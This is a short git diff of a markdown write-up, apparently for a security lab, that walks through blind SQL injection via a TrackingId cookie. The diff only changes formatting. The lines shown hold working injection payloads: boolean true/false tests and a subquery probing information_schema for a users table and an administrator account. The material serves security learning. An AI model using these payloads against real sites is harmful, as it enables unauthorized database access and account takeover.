@@ -120,13 +120,13 @@ If we just send this message, we get a *Welcome Back* message.
 
 To see if the cookie is vulnerable to SQL Injections, we try a few small things:\
 `Cookie: TrackingId=4qq9peoK98lxFHKV'; session=xxxxxxx`\
-* No *Welcome Back* message\
+&nbsp;&nbsp;&nbsp;No *Welcome Back* message\
 `Cookie: TrackingId=4qq9peoK98lxFHKV' OR '1'='1; session=xxxxxxx`\
-* *Welcome Back* message\
+&nbsp;&nbsp;&nbsp;*Welcome Back* message\
 `Cookie: TrackingId=4qq9peoK98lxFHKV' AND '1'='2; session=xxxxxxx`\
-* No *Welcome Back* message\
+&nbsp;&nbsp;&nbsp;No *Welcome Back* message\
 `Cookie: TrackingId=' OR 1=1 OR '1'='2; session=xxxxxxx`\
-* *Welcome Back* message (This one is important because now we don't have to worry about the TrackingId itself, and the quotes in the *1=1* middle part.)
+&nbsp;&nbsp;&nbsp;*Welcome Back* message (This one is important because now we don't have to worry about the TrackingId itself, and the quotes in the *1=1* middle part.)
 
 Let's see if there's a *users* table, and an *administrator* account:\
 `Cookie: TrackingId=' OR (SELECT COUNT(Table_Name) FROM information_schema.tables WHERE Table_Name='users')=1 OR '1'='2; session=xxxxxxx`\
